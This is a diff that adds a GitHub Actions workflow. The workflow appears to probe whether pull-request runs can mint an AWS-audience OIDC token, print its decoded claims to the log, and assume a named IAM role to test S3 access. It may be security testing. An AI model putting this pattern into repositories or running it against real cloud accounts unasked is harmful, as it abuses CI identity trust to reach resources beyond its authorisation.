@@ -1,0 +1,35 @@
+name: i734 pr oidc probe
+on:
+  pull_request:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  claims:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dump oidc claims
+        run: |
+          set -euo pipefail
+          TOK=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value)
+          P=$(echo "$TOK" | cut -d. -f2 | tr '_-' '/+')
+          while [ $(( ${#P} % 4 )) -ne 0 ]; do P="$P="; done
+          echo "OIDCCLAIMS_BEGIN"
+          echo "$P" | base64 -d 2>/dev/null || true
+          echo
+          echo "OIDCCLAIMS_END"
+  s3role:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: assume s3 role
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role
+          aws-region: eu-west-1
+          role-session-name: i734s3c
+      - name: matrix
+        run: bash i734_probe.sh s3 eu-west-1
